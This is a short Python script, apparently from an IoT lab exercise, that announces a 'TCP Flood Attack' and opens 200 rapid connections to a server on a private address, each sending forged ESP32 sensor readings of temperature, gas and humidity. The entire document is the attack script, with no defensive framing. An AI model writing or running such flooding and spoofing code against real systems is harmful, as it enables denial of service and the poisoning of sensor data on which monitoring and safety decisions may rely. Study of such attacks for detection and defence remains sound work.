import socket
import random
import time

HOST = "10.194.116.77"
PORT = 5000

PACKET_COUNT = 200

print("[*] Starting TCP Flood Attack...")

for i in range(PACKET_COUNT):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        s.connect((HOST, PORT))

        temp = round(random.uniform(26, 30), 2)
        gas = round(random.uniform(1200, 1800), 2)
        hum = round(random.uniform(25, 35), 2)

        payload = f"{temp},{gas},{hum},ESP32"

        s.send(payload.encode())
        s.close()

        time.sleep(0.01)

    except Exception as e:
        print("Connection error:", e)

print("[*] TCP Flood Finished")